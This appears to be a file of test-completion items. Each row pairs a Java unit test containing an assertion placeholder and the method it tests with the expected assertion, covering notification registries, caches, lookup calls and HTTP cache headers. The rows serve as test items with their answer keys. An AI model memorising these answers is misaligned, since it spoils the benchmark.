getNotifications(int maxAmount, long maxWaitTime, TimeUnit unit) { List<ClientNotificationMessage> collected = new LinkedList<>(); try { //blocking wait to get first message ClientNotificationMessage next = m_notifications.poll(maxWaitTime, unit); if (next != null) { collected.add(next); }  //add more available notifications //with short wait timeout to not go back with one notification when some are about to pop up. int timeout = 234; // 0 for no reschedule while (next != null && collected.size() < maxAmount) { next = m_notifications.poll(timeout, TimeUnit.MILLISECONDS); if (next != null) { collected.add(next); } } } catch (InterruptedException e) { LOG.info(""Interrupted while waiting for client notification messages"", e); } return collected; }"	assertEquals(2, collector.size())
"testNotificationsUnregisteredSingleSession() { ClientNotificationRegistry reg = new ClientNotificationRegistry(TEST_QUEUE_EXPIRE_TIMEOUT); reg.registerNode(NodeId.of(""testNodeId"")); reg.putForUser(TEST_USER, TEST_NOTIFICATION); List<ClientNotificationMessage> notificationsNode = consumeNoWait(reg, NodeId.of(""testNodeId"")); ""<AssertPlaceHolder>""; }
putForUser(String userId, Serializable notification) { putForUser(userId, notification, true); }"	assertEquals(1, notificationsNode.size())
"testNotificationsForAllSessions() { ClientNotificationRegistry reg = new ClientNotificationRegistry(TEST_QUEUE_EXPIRE_TIMEOUT); reg.registerNode(NodeId.of(""testNodeId"")); reg.putForAllSessions(TEST_NOTIFICATION); List<ClientNotificationMessage> notificationsNode = consumeNoWait(reg, NodeId.of(""testNodeId"")); ""<AssertPlaceHolder>""; }
putForAllSessions(Serializable notification) { putForAllSessions(notification, true); }"	assertEquals(1, notificationsNode.size())
"testEmptyNotificationsAreNotDistributedOverCluster() { final IClusterSynchronizationService mockClusterSyncService = Mockito.mock(IClusterSynchronizationService.class); final IBean<?> bean = BeanTestingHelper.get().registerBean(new BeanMetaData(IClusterSynchronizationService.class) .withInitialInstance(mockClusterSyncService) .withApplicationScoped(true)); try { ClientNotificationRegistry reg = new ClientNotificationRegistry(TEST_QUEUE_EXPIRE_TIMEOUT); reg.registerNode(NodeId.of(""testNodeId"")); reg.publish(Collections.emptySet()); ""<AssertPlaceHolder>""; Mockito.verifyNoInteractions(mockClusterSyncService); } finally { BeanTestingHelper.get().unregisterBean(bean); } }
publish(Collection<? extends ClientNotificationMessage> messages) { publishWithoutClusterNotification(messages, null); publishClusterInternal(messages); }"	"assertEquals(Collections.emptyList(), consumeNoWait(reg, NodeId.of(""testNodeId"")))"
"registeredNodeAvailable() { ClientNotificationRegistry reg = new ClientNotificationRegistry(TEST_QUEUE_EXPIRE_TIMEOUT); reg.registerNode(TEST_NODE); ""<AssertPlaceHolder>""; }
getRegisteredNodeIds() { synchronized (m_notificationQueues) { return new HashSet<>(m_notificationQueues.keySet()); } }"	assertTrue(reg.getRegisteredNodeIds().contains(TEST_NODE))
"registeredNodeInitialsNotAvailable() { ClientNotificationRegistry reg = new ClientNotificationRegistry(TEST_QUEUE_EXPIRE_TIMEOUT); ""<AssertPlaceHolder>""; }
getRegisteredNodeIds() { synchronized (m_notificationQueues) { return new HashSet<>(m_notificationQueues.keySet()); } }"	assertFalse(reg.getRegisteredNodeIds().contains(TEST_NODE))
"registeredNodeNotAvailable_afterUnregister() { ClientNotificationRegistry reg = new ClientNotificationRegistry(TEST_QUEUE_EXPIRE_TIMEOUT); reg.registerNode(TEST_NODE); reg.unregisterNode(TEST_NODE); ""<AssertPlaceHolder>""; }
getRegisteredNodeIds() { synchronized (m_notificationQueues) { return new HashSet<>(m_notificationQueues.keySet()); } }"	assertFalse(reg.getRegisteredNodeIds().contains(TEST_NODE))
"testNodeAvailable_AfterUnregisterSession() { ClientNotificationRegistry reg = new ClientNotificationRegistry(TEST_QUEUE_EXPIRE_TIMEOUT); reg.registerNode(TEST_NODE); ""<AssertPlaceHolder>""; }
getRegisteredNodeIds() { synchronized (m_notificationQueues) { return new HashSet<>(m_notificationQueues.keySet()); } }"	assertTrue(reg.getRegisteredNodeIds().contains(TEST_NODE))
"InterruptedException { ClientNotificationRegistry reg = new ClientNotificationRegistry(10); reg.registerNode(TEST_NODE); Thread.sleep(100); reg.putForAllNodes(""notification""); List<ClientNotificationMessage> consumed = consumeNoWait(reg, TEST_NODE); ""<AssertPlaceHolder>""; }
putForAllNodes(Serializable notification) { putForAllNodes(notification, true); }"	assertTrue(consumed.isEmpty())
"InterruptedException { ClientNotificationRegistry reg = new ClientNotificationRegistry(100); reg.registerNode(TEST_NODE); for (int i = 0; i < 100; i++) { Thread.sleep(10); consumeNoWait(reg, TEST_NODE); } reg.putForAllNodes(""notification""); List<ClientNotificationMessage> consumed = consumeNoWait(reg, TEST_NODE); ""<AssertPlaceHolder>""; }
putForAllNodes(Serializable notification) { putForAllNodes(notification, true); }"	assertFalse(consumed.isEmpty())
"testCoalesceEmptySet() { List<? extends Serializable> res = BEANS.get(NotificationCoalescer.class).coalesce(new ArrayList<>()); ""<AssertPlaceHolder>""; }
coalesce(List<T> notificationsIn) { if (notificationsIn.size() < 2) { return notificationsIn; } else { int i = 0; List<T> res = notificationsIn; while (i < res.size()) { final List<ICoalescer> coalescers = m_registry.getBeans(res.get(i).getClass()); @SuppressWarnings(""unchecked"") ICoalescer<T> c = CollectionUtility.firstElement(coalescers); if (c != null) { int j = getCoalesceCount(c, res.subList(i, res.size())); res = coalesce(i, i + j, c, res); } i++; } return res; } }"	assertTrue(res.isEmpty())
"testRegistry() { CacheRegistryService s = new CacheRegistryService(); String testKey = ""testkey""; BasicCache<String, String> testCache = new BasicCache<>(testKey, null, mock(ICacheValueResolver.class), new HashMap<>()); s.register(testCache); ""<AssertPlaceHolder>""; }
get(String cacheId) { return (ICache<K, V>) Assertions.assertNotNull(opt(cacheId)); }"	assertEquals(testCache, s.get(testKey))
"testRegistryIfAbsent() { CacheRegistryService s = new CacheRegistryService(); String testKey = ""testkey""; BasicCache<String, String> testCache = new BasicCache<>(testKey, null, mock(ICacheValueResolver.class), new HashMap<>()); s.registerIfAbsent(testCache); ""<AssertPlaceHolder>""; }
get(String cacheId) { return (ICache<K, V>) Assertions.assertNotNull(opt(cacheId)); }"	assertEquals(testCache, s.get(testKey))
"testDuplicateCreateIfAbsent() { CacheRegistryService s = new CacheRegistryService(); String cacheId = ""testcacheid""; ICache<String, String> cache1 = new BasicCache<>(cacheId, null, key -> ""Valuf of "" + key, new HashMap<>()); s.registerIfAbsent(cache1); ICache<String, String> cache2 = new BasicCache<>(cacheId, null, key -> ""Valuf of "" + key, new HashMap<>()); ICache<String, String> cache = s.registerIfAbsent(cache2); ""<AssertPlaceHolder>""; }
registerIfAbsent(ICache<K, V> cache) { return (ICache<K, V>) getMap().computeIfAbsent(cache.getCacheId(), id -> cache); }"	assertSame(cache1, cache)
"testNullBitName() { byte holder = 0; NamedBitMaskHelper bitMask = new NamedBitMaskHelper(); try { holder = bitMask.setBit(null, holder); Assert.fail(""null bitname is not allowed""); } catch (AssertionException e) { // ok } Assert.""<AssertPlaceHolder>""; // ensure unchanged }
setBit(String bitName, byte holder) { return changeBit(bitName, true, holder); }"	assertEquals(0, holder)
"testEmptyRegistry() { final TypeParameterBeanRegistry<ITestHandler> reg = new TypeParameterBeanRegistry<>(ITestHandler.class); ""<AssertPlaceHolder>""; }
getBeans(final Class<?> lookupType) { updateLookupTypeHierarchyIndex(lookupType);  m_lock.readLock().lock(); try { final List<BEAN> beans = new ArrayList<>(); for (final BeanRegistration<BEAN> registration : m_genericTypeIndex.get(lookupType)) { beans.add(registration.getBean()); } return beans; } finally { m_lock.readLock().unlock(); } }"	assertTrue(reg.getBeans(String.class).isEmpty())
"testEmptyRegistration() { final TypeParameterBeanRegistry<ITestHandler> reg = new TypeParameterBeanRegistry<>(ITestHandler.class); final List<ITestHandler> l = new ArrayList<>(); reg.registerBeans(l); ""<AssertPlaceHolder>""; }
getBeans(final Class<?> lookupType) { updateLookupTypeHierarchyIndex(lookupType);  m_lock.readLock().lock(); try { final List<BEAN> beans = new ArrayList<>(); for (final BeanRegistration<BEAN> registration : m_genericTypeIndex.get(lookupType)) { beans.add(registration.getBean()); } return beans; } finally { m_lock.readLock().unlock(); } }"	assertTrue(reg.getBeans(String.class).isEmpty())
"testGetDataByAll() { P_LegacyCodeLookupCall oldLc = new P_LegacyCodeLookupCall(); List<ILookupRow<Integer>> oldRows = oldLc.getDataByAll();  P_NewCodeLookupCall newLc = new P_NewCodeLookupCall(); List<ILookupRow<Integer>> newRows = newLc.getDataByAll();  ""<AssertPlaceHolder>""; }
getDataByAll() { final Pattern pat = createSearchPattern(getAll()); AbstractLookupRowCollector v = new AbstractLookupRowCollector() { @Override protected ILookupRow<CODE_ID> toLookupRow(ICode<CODE_ID> code) { ILookupRow<CODE_ID> row = execCreateLookupRowFromCode(code); if (row != null && row.getText() != null && pat.matcher(row.getText().toLowerCase()).matches()) { return row; } return null; } }; resolveCodes(v); return v.getLookupRows(); }"	"assertTrue(""identical rows for old and new lookup call"", equals(oldRows, newRows))"
"testGetDataByText() { P_LegacyCodeLookupCall oldLc = new P_LegacyCodeLookupCall(); List<ILookupRow<Integer>> oldRows = oldLc.getDataByText();  P_NewCodeLookupCall newLc = new P_NewCodeLookupCall(); List<ILookupRow<Integer>> newRows = newLc.getDataByText();  ""<AssertPlaceHolder>""; }
getDataByText() { final Pattern pat = createSearchPattern(getText()); AbstractLookupRowCollector v = new AbstractLookupRowCollector() { @Override protected ILookupRow<CODE_ID> toLookupRow(ICode<CODE_ID> code) { ILookupRow<CODE_ID> row = execCreateLookupRowFromCode(code); if (row != null && row.getText() != null && (pat.matcher(row.getText().toLowerCase()).matches() || (isHierarchicalLookup() && isParentInResultList(m_list, row)))) { return row; } return null; } }; resolveCodes(v); return v.getLookupRows(); }"	"assertTrue(""identical rows for old and new lookup call"", equals(oldRows, newRows))"
"testGetFilteredData() { P_LegacyCodeLookupCall oldLc = new P_LegacyCodeLookupCall(); oldLc.setFilter((call, code, treeLevel) -> true); List<ILookupRow<Integer>> oldRows = oldLc.getDataByAll();  P_NewCodeLookupCall newLc = new P_NewCodeLookupCall(); newLc.setFilter((call, code, treeLevel) -> true); List<ILookupRow<Integer>> newRows = newLc.getDataByAll();  ""<AssertPlaceHolder>""; }
getDataByAll() { final Pattern pat = createSearchPattern(getAll()); AbstractLookupRowCollector v = new AbstractLookupRowCollector() { @Override protected ILookupRow<CODE_ID> toLookupRow(ICode<CODE_ID> code) { ILookupRow<CODE_ID> row = execCreateLookupRowFromCode(code); if (row != null && row.getText() != null && pat.matcher(row.getText().toLowerCase()).matches()) { return row; } return null; } }; resolveCodes(v); return v.getLookupRows(); }"	"assertTrue(""identical rows for old and new lookup call"", equals(oldRows, newRows))"
"testGetDataByAll_FilterActive() { P_LocalLookupCall lc = new P_LocalLookupCall(); lc.setActive(TriState.TRUE); List<? extends ILookupRow<Integer>> rows = lc.getDataByAll(); ""<AssertPlaceHolder>""; }
getDataByAll() { List<ILookupRow<T>> list = new ArrayList<>(); Pattern p = createSearchPattern(getAll()); for (ILookupRow<T> row : createLookupRowsFiltered()) { if (row.getText() != null && p.matcher(row.getText().toLowerCase()).matches()) { list.add(row); } } return list; }"	"assertEquals(""rows length"", 6, rows.size())"
"testGetDataByKey_InactiveRow() { P_LocalLookupCall lc = new P_LocalLookupCall(); lc.setActive(TriState.TRUE); lc.setKey(ROW40_KEY); List<? extends ILookupRow<Integer>> rows = lc.getDataByKey(); ""<AssertPlaceHolder>""; }
getDataByKey() { if (getKey() == null) { return CollectionUtility.emptyArrayList(); } Object key = getKey(); List<? extends ILookupRow<T>> rows = interceptCreateLookupRows(); if (rows == null) { return CollectionUtility.emptyArrayList(); } List<ILookupRow<T>> list = new ArrayList<>(rows.size()); for (ILookupRow<T> row : rows) { if (key.equals(row.getKey())) { list.add(row); } } return list; }"	"assertEquals(""rows length"", 1, rows.size())"
"testGetDataByAll_FilterInactive() { P_LocalLookupCall lc = new P_LocalLookupCall(); lc.setActive(TriState.FALSE); List<? extends ILookupRow<Integer>> rows = lc.getDataByAll(); ""<AssertPlaceHolder>""; }
getDataByAll() { List<ILookupRow<T>> list = new ArrayList<>(); Pattern p = createSearchPattern(getAll()); for (ILookupRow<T> row : createLookupRowsFiltered()) { if (row.getText() != null && p.matcher(row.getText().toLowerCase()).matches()) { list.add(row); } } return list; }"	"assertEquals(""rows length"", 2, rows.size())"
"testGetDataByText() { P_LocalLookupCall lc = new P_LocalLookupCall(); List<? extends ILookupRow<Integer>> rows = lc.getDataByText(); ""<AssertPlaceHolder>""; }
getDataByText() { List<ILookupRow<T>> list = new ArrayList<>(); Pattern p = createSearchPattern(getText()); List<? extends ILookupRow<T>> lookupRows = createLookupRowsFiltered(); for (ILookupRow<T> row : lookupRows) { if (row.getText() != null && p.matcher(row.getText().toLowerCase()).matches()) { list.add(row); } } if (isHierarchicalLookup()) { Map<T, Set<ILookupRow<T>>> nodeMap = createNodeMap(lookupRows); List<ILookupRow<T>> children = new ArrayList<>(); for (ILookupRow<T> res : list) { collectChildrenRec(nodeMap, res.getKey(), children); } list.addAll(children); } return list; }"	"assertEquals(""rows length"", 8, rows.size())"
"testRepeatingWildcards() { P_LocalLookupCall lc = new P_LocalLookupCall(); Pattern p = lc.createSearchPattern(""***hello*world**test*""); ""<AssertPlaceHolder>""; }
createSearchPattern(String s) { if (s == null) { s = """"; } s = s.replace(getWildcard(), WILDCARD_PLACEHOLDER); s = s.toLowerCase(); s = StringUtility.escapeRegexMetachars(s);  // replace repeating wildcards to prevent regex DoS String duplicateWildcards = WILDCARD_PLACEHOLDER.concat(WILDCARD_PLACEHOLDER); while (s.contains(duplicateWildcards)) { s = s.replace(duplicateWildcards, WILDCARD_PLACEHOLDER); }  if (!s.contains(WILDCARD_PLACEHOLDER)) { s = s.concat(WILDCARD_PLACEHOLDER); }  s = s.replace(WILDCARD_PLACEHOLDER, "".*""); return Pattern.compile(s, Pattern.DOTALL); }"	"assertFalse(""no repeating wildcard should be contained in the search pattern."", p.toString().contains("".*.*""))"
"testActive() { ILookupRow<String> row = new LookupRow<>(""key"", ""text""); row.withActive(true); row.withActive(false); row.withActive(true); ""<AssertPlaceHolder>""; }
isActive() { return getOrElse(ACTIVE_BIT, Boolean.TRUE); }"	assertTrue(row.isActive())
"Throwable { BinaryServiceTunnelContentHandler handler = new BinaryServiceTunnelContentHandler(); handler.initialize(); ByteArrayOutputStream bos = new ByteArrayOutputStream(); handler.writeRequest(bos, new ServiceTunnelRequest(""test"", null, null, null)); bos.close(); ServiceTunnelRequest readRequest = handler.readRequest(new ByteArrayInputStream(bos.toByteArray())); ""<AssertPlaceHolder>""; }
readRequest(InputStream in) throws IOException, ClassNotFoundException { return readData(in, ServiceTunnelRequest.class); }"	"assertEquals(""test"", readRequest.getServiceInterfaceClassName())"
"Throwable { BinaryServiceTunnelContentHandler handler = new BinaryServiceTunnelContentHandler(); handler.initialize(); ByteArrayOutputStream bos = new ByteArrayOutputStream(); handler.writeResponse(bos, new ServiceTunnelResponse(""test"", null)); bos.close(); ServiceTunnelResponse readResponse = handler.readResponse(new ByteArrayInputStream(bos.toByteArray())); ""<AssertPlaceHolder>""; }
readResponse(InputStream in) throws IOException, ClassNotFoundException { return readData(in, ServiceTunnelResponse.class); }"	"assertEquals(""test"", readResponse.getData())"
"Throwable { SoapServiceTunnelContentHandler handler = new SoapServiceTunnelContentHandler(); handler.initialize(); ByteArrayOutputStream bos = new ByteArrayOutputStream(); handler.writeRequest(bos, new ServiceTunnelRequest(""test"", ""testop"", null, null)); bos.close(); ServiceTunnelRequest readRequest = handler.readRequest(new ByteArrayInputStream(bos.toByteArray())); ""<AssertPlaceHolder>""; }
readRequest(InputStream in) throws IOException, ClassNotFoundException { return (ServiceTunnelRequest) read(in); }"	"assertEquals(""test"", readRequest.getServiceInterfaceClassName())"
"Throwable { SoapServiceTunnelContentHandler handler = new SoapServiceTunnelContentHandler(); handler.initialize(); ByteArrayOutputStream bos = new ByteArrayOutputStream(); handler.writeResponse(bos, new ServiceTunnelResponse(""test"", null)); bos.close(); ServiceTunnelResponse readResponse = handler.readResponse(new ByteArrayInputStream(bos.toByteArray())); ""<AssertPlaceHolder>""; }
readResponse(InputStream in) throws IOException, ClassNotFoundException { return (ServiceTunnelResponse) read(in); }"	"assertEquals(""test"", readResponse.getData())"
"testComputeIfAbsentValueAlreadySet() { m_sessionData.set(TEST_KEY, TEST_DATA); Object value = m_sessionData.computeIfAbsent(TEST_KEY, () -> { fail(""Value is already set""); return null; }); ""<AssertPlaceHolder>""; }
computeIfAbsent(String key, Callable<?> producer) { Assertions.assertNotNull(producer, ""producer must not be null""); Assertions.assertNotNull(key, ""key must not be null"");  Object existingValue = m_dataMap.get(key); if (existingValue != null) { return existingValue; }  Object newValue; try { newValue = producer.call(); } catch (Exception e) { throw BEANS.get(PlatformExceptionTranslator.class).translate(e); } if (newValue == null) { return null; }  existingValue = m_dataMap.putIfAbsent(key, newValue); if (existingValue != null) { return existingValue; } return newValue; }"	assertSame(TEST_DATA, value)
"testComputeIfAbsentDataWithOtherTypeAlreadySet() { m_sessionData.set(TEST_KEY, TEST_DATA); Object value = m_sessionData.computeIfAbsent(TEST_KEY, (Callable<String>) () -> ""test""); ""<AssertPlaceHolder>""; }
computeIfAbsent(String key, Callable<?> producer) { Assertions.assertNotNull(producer, ""producer must not be null""); Assertions.assertNotNull(key, ""key must not be null"");  Object existingValue = m_dataMap.get(key); if (existingValue != null) { return existingValue; }  Object newValue; try { newValue = producer.call(); } catch (Exception e) { throw BEANS.get(PlatformExceptionTranslator.class).translate(e); } if (newValue == null) { return null; }  existingValue = m_dataMap.putIfAbsent(key, newValue); if (existingValue != null) { return existingValue; } return newValue; }"	assertSame(TEST_DATA, value)
"testDefaultAgent() { DefaultUserAgentParser parser = new DefaultUserAgentParser(); String id = m_defaultAgent.createIdentifier(parser); UserAgent parsedAgent = UserAgents.createByIdentifier(parser, id); ""<AssertPlaceHolder>""; }
createIdentifier(UserAgent userAgent) { String uiDeviceId = userAgent.getUiDeviceId(); if (uiDeviceId.contains(DELIMITER)) { uiDeviceId = uiDeviceId.replaceAll(""\"" + DELIMITER, ""_""); LOG.warn(""Character which is used as delimiter has been found in uiDeviceId. Replaced with '_'. Old uiDeviceId: {}. New uiDeviceId: {}"", userAgent.getUiDeviceId(), uiDeviceId); } return StringUtility.concatenateTokens( userAgent.getUiLayer().getIdentifier(), DELIMITER, userAgent.getUiDeviceType().getIdentifier(), DELIMITER, userAgent.getUiEngineType().getIdentifier(), DELIMITER, userAgent.getUiSystem().getIdentifier(), DELIMITER, uiDeviceId); }"	assertEquals(m_defaultAgent, parsedAgent)
"testParsingCustomAgent() { UserAgent testUserAgent = UserAgents .create() .withUiLayer(UiLayer.HTML) .withUiDeviceType(UiDeviceType.MOBILE) .withUiEngineType(UiEngineType.ANDROID) .withUiSystem(UiSystem.ANDROID) .withDeviceId(""Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"") .build(); DefaultUserAgentParser parser = new DefaultUserAgentParser(); String id = testUserAgent.createIdentifier(parser);  UserAgent parsedAgent = UserAgents.createByIdentifier(parser, id); ""<AssertPlaceHolder>""; }
createIdentifier(UserAgent userAgent) { String uiDeviceId = userAgent.getUiDeviceId(); if (uiDeviceId.contains(DELIMITER)) { uiDeviceId = uiDeviceId.replaceAll(""\"" + DELIMITER, ""_""); LOG.warn(""Character which is used as delimiter has been found in uiDeviceId. Replaced with '_'. Old uiDeviceId: {}. New uiDeviceId: {}"", userAgent.getUiDeviceId(), uiDeviceId); } return StringUtility.concatenateTokens( userAgent.getUiLayer().getIdentifier(), DELIMITER, userAgent.getUiDeviceType().getIdentifier(), DELIMITER, userAgent.getUiEngineType().getIdentifier(), DELIMITER, userAgent.getUiSystem().getIdentifier(), DELIMITER, uiDeviceId); }"	assertEquals(testUserAgent, parsedAgent)
"testTryParseWithValidInput() { String[] tests = {""path/basename.js"", ""path/basename.min.js"", ""path/basename-34fce3bc.min.js"", ""path/subpath/basename-34fce3bc.min.css"", ""path/subpath/entry1~entry2-34fce3bc.min.css"", ""/res/lib-1.10.88/lib.js"", ""base.css""}; for (String test : tests) { ""<AssertPlaceHolder>""; } }
toString() { return fullPath(); }"	"assertEquals(""invalid input: "" + test, test, ScriptRequest.tryParse(test).orElseThrow(() -> new IllegalArgumentException(""invalid input: "" + test)).toString())"
"InterruptedException { final CountDownLatch jobStarted = new CountDownLatch(1); final CountDownLatch jobsCancelled = new CountDownLatch(1); IFuture<String> future = ModelJobs.schedule(() -> { jobStarted.countDown(); try { jobsCancelled.await(); } catch (InterruptedException expected) { // expected } return ""completed""; }, ModelJobs.newInput(ClientRunContexts.empty().withSession(clientSession(), true)));  jobStarted.await(); BEANS.get(UiJobs.class).cancelModelJobs(clientSession()); ""<AssertPlaceHolder>"";  jobsCancelled.countDown(); try { future.awaitDoneAndGet(); fail(""Expecting a "" + FutureCancelledError.class); } catch (FutureCancelledError expected) { // expected } }
cancelModelJobs(IClientSession clientSession) { Jobs.getJobManager().cancel(ModelJobs.newFutureFilterBuilder() .andMatch(new SessionFutureFilter(clientSession)) .andMatchNotExecutionHint(EXECUTION_HINT_RESPONSE_TO_JSON) .andMatchNotExecutionHint(EXECUTION_HINT_POLL_REQUEST) .andMatchNotExecutionHint(ModelJobs.EXECUTION_HINT_UI_INTERACTION_REQUIRED) .andMatchNotExecutionHint(ModelJobs.EXECUTION_HINT_NOT_CANCELLABLE_BY_USER) .toFilter(), true); }"	assertTrue(future.isCancelled())
"testDetectAndClearWithNoInterrupt() { BEANS.get(UiThreadInterruption.class).detectAndClear(this, ""test""); ""<AssertPlaceHolder>""; }
detectAndClear(Object caller, String path) { if (Thread.currentThread().isInterrupted()) { Thread.interrupted(); boolean success = !Thread.currentThread().isInterrupted(); LOG.warn(""DETECTED_THREAD_INTERRUPTION in {}#{} '{}', clearing interrupt status {}"", caller.getClass().getName(), Integer.toHexString(caller.hashCode()), path, success ? ""successful"" : ""failed"", new Exception(""Calling trace"")); } }"	assertEquals(0, m_appender.logEvents.size())
"testCheckAndSet_DisableCaching() { Mockito.when(req.getPathInfo()).thenReturn(""/"");  BinaryResource res = BinaryResources.create() .withFilename(""a.html"") .withContent(""<html></html>"".getBytes(StandardCharsets.UTF_8)) .withCachingAllowed(false) .build(); HttpCacheObject obj = new HttpCacheObject(new HttpCacheKey(""/""), res); boolean b = cc.checkAndSetCacheHeaders(req, resp, obj); Assert.""<AssertPlaceHolder>"";  Mockito.verify(req, ANY_TIMES).getPathInfo(); Mockito.verify(req, ANY_TIMES).getAttribute(""jakarta.servlet.forward.path_info""); Mockito.verify(resp, ONCE).setHeader(HttpCacheControl.CACHE_CONTROL, ""private, no-store, no-cache, max-age=0""); }
checkAndSetCacheHeaders(HttpServletRequest req, HttpServletResponse resp, HttpCacheObject obj) { if (!UrlHints.isCacheHint(req)) { disableCaching(req, resp); return false; }  if (obj == null || !obj.isCachingAllowed()) { disableCaching(req, resp); return false; }  int maxAge = obj.getCacheMaxAge(); if (maxAge > 0) { // ""private"" //   Only browsers may cache this resource. // ""max-age"" //   A cache may use this resource for X seconds without checking with the server. s-maxage //   is basically the same, but for proxies (s = shared). This overrides any default value //   the proxy may use internally. // Note: Because ""must-revalidate"" is not present, a cache MAY use a stale resource longer than max-age. resp.setHeader(CACHE_CONTROL, ""private, max-age="" + maxAge + "", s-maxage="" + maxAge); } else { // ""private"" //   Only browsers may cache this resource. // ""must-revalidate"" //   A cache HAS TO check with the server before using stale resources. // ""max-age=0"" //   A resource will become stale immediately (after 0 seconds). // Note: ""max-age=0, must-revalidate"" would be the same as ""no-cache"" resp.setHeader(CACHE_CONTROL, ""private, max-age=0, must-revalidate""); }  String etag = obj.createETag(); String ifNoneMatch = req.getHeader(IF_NONE_MATCH); boolean clientSentEtag = (ifNoneMatch != null);  // Check If-None-Match (Etag) if (clientSentEtag) { if (notModified(ifNoneMatch, etag)) { if (LOG.isDebugEnabled()) { LOG.debug(""Use http cached object (If-None-Match/Etag): {}"", req.getPathInfo()); } resp.setStatus(HttpServletResponse.SC_NOT_MODIFIED); return true; } // When the Etag comparison fails (i.e. file was modified), we must _not_ check for If-Modified-Since! } // Check If-Modified-Since else { long ifModifiedSince = req.getDateHeader(IF_MODIFIED_SINCE); if (notModifiedSince(ifModifiedSince, obj.getResource().getLastModified())) { if (LOG.isDebugEnabled()) { LOG.debug(""Use http cached object (If-Modified-Since): {}"", req.getPathInfo()); } resp.setStatus(HttpServletResponse.SC_NOT_MODIFIED); return true; } }  if (obj.getResource().getLastModified() > 0) { resp.setDateHeader(LAST_MODIFIED, obj.getResource().getLastModified()); } if (etag != null) { resp.setHeader(ETAG, etag); }  return false; }"	assertFalse(b)
"testCheckAndSet_EnableCaching() { Mockito.when(req.getPathInfo()).thenReturn(""/""); Mockito.when(req.getHeader(HttpCacheControl.ETAG)).thenReturn(null); Mockito.when(req.getHeader(HttpCacheControl.IF_NONE_MATCH)).thenReturn(null); Mockito.when(req.getDateHeader(HttpCacheControl.IF_MODIFIED_SINCE)).thenReturn(0L);  BinaryResource res = BinaryResources.create() .withFilename(""a.html"") .withContent(""<html></html>"".getBytes(StandardCharsets.UTF_8)) .withCachingAllowed(true) .withLastModified(0L) .build(); HttpCacheObject obj = new HttpCacheObject(new HttpCacheKey(""/""), res); boolean b = cc.checkAndSetCacheHeaders(req, resp, obj); Assert.""<AssertPlaceHolder>"";  Mockito.verify(req, ANY_TIMES).getPathInfo(); Mockito.verify(req, ANY_TIMES).getAttribute(""jakarta.servlet.forward.path_info""); Mockito.verify(req, ANY_TIMES).getHeader(HttpCacheControl.ETAG); Mockito.verify(req, ANY_TIMES).getHeader(HttpCacheControl.IF_NONE_MATCH); Mockito.verify(req, ANY_TIMES).getDateHeader(HttpCacheControl.IF_MODIFIED_SINCE); Mockito.verify(resp, ONCE).setHeader(HttpCacheControl.CACHE_CONTROL, ""private, max-age=0, must-revalidate""); Mockito.verify(resp, ONCE).setHeader(HttpCacheControl.ETAG, obj.createETag()); }
checkAndSetCacheHeaders(HttpServletRequest req, HttpServletResponse resp, HttpCacheObject obj) { if (!UrlHints.isCacheHint(req)) { disableCaching(req, resp); return false; }  if (obj == null || !obj.isCachingAllowed()) { disableCaching(req, resp); return false; }  int maxAge = obj.getCacheMaxAge(); if (maxAge > 0) { // ""private"" //   Only browsers may cache this resource. // ""max-age"" //   A cache may use this resource for X seconds without checking with the server. s-maxage //   is basically the same, but for proxies (s = shared). This overrides any default value //   the proxy may use internally. // Note: Because ""must-revalidate"" is not present, a cache MAY use a stale resource longer than max-age. resp.setHeader(CACHE_CONTROL, ""private, max-age="" + maxAge + "", s-maxage="" + maxAge); } else { // ""private"" //   Only browsers may cache this resource. // ""must-revalidate"" //   A cache HAS TO check with the server before using stale resources. // ""max-age=0"" //   A resource will become stale immediately (after 0 seconds). // Note: ""max-age=0, must-revalidate"" would be the same as ""no-cache"" resp.setHeader(CACHE_CONTROL, ""private, max-age=0, must-revalidate""); }  String etag = obj.createETag(); String ifNoneMatch = req.getHeader(IF_NONE_MATCH); boolean clientSentEtag = (ifNoneMatch != null);  // Check If-None-Match (Etag) if (clientSentEtag) { if (notModified(ifNoneMatch, etag)) { if (LOG.isDebugEnabled()) { LOG.debug(""Use http cached object (If-None-Match/Etag): {}"", req.getPathInfo()); } resp.setStatus(HttpServletResponse.SC_NOT_MODIFIED); return true; } // When the Etag comparison fails (i.e. file was modified), we must _not_ check for If-Modified-Since! } // Check If-Modified-Since else { long ifModifiedSince = req.getDateHeader(IF_MODIFIED_SINCE); if (notModifiedSince(ifModifiedSince, obj.getResource().getLastModified())) { if (LOG.isDebugEnabled()) { LOG.debug(""Use http cached object (If-Modified-Since): {}"", req.getPathInfo()); } resp.setStatus(HttpServletResponse.SC_NOT_MODIFIED); return true; } }  if (obj.getResource().getLastModified() > 0) { resp.setDateHeader(LAST_MODIFIED, obj.getResource().getLastModified()); } if (etag != null) { resp.setHeader(ETAG, etag); }  return false; }"	assertFalse(b)
"testCheckAndSet_EnableCaching_MaxAge3() { Mockito.when(req.getPathInfo()).thenReturn(""/""); Mockito.when(req.getHeader(HttpCacheControl.ETAG)).thenReturn(null); Mockito.when(req.getHeader(HttpCacheControl.IF_NONE_MATCH)).thenReturn(null); Mockito.when(req.getDateHeader(HttpCacheControl.IF_MODIFIED_SINCE)).thenReturn(0L);  BinaryResource res = BinaryResources.create() .withFilename(""a.html"") .withContent(""<html></html>"".getBytes(StandardCharsets.UTF_8)) .withCachingAllowed(true) .withCacheMaxAge(3) .withLastModified(0L) .build(); HttpCacheObject obj = new HttpCacheObject(new HttpCacheKey(""/""), res); boolean b = cc.checkAndSetCacheHeaders(req, resp, obj); Assert.""<AssertPlaceHolder>"";  Mockito.verify(req, ANY_TIMES).getPathInfo(); Mockito.verify(req, ANY_TIMES).getAttribute(""jakarta.servlet.forward.path_info""); Mockito.verify(req, ANY_TIMES).getHeader(HttpCacheControl.ETAG); Mockito.verify(req, ANY_TIMES).getHeader(HttpCacheControl.IF_NONE_MATCH); Mockito.verify(req, ANY_TIMES).getDateHeader(HttpCacheControl.IF_MODIFIED_SINCE); Mockito.verify(resp, ONCE).setHeader(HttpCacheControl.CACHE_CONTROL, ""private, max-age=3, s-maxage=3""); Mockito.verify(resp, ONCE).setHeader(HttpCacheControl.ETAG, obj.createETag()); }
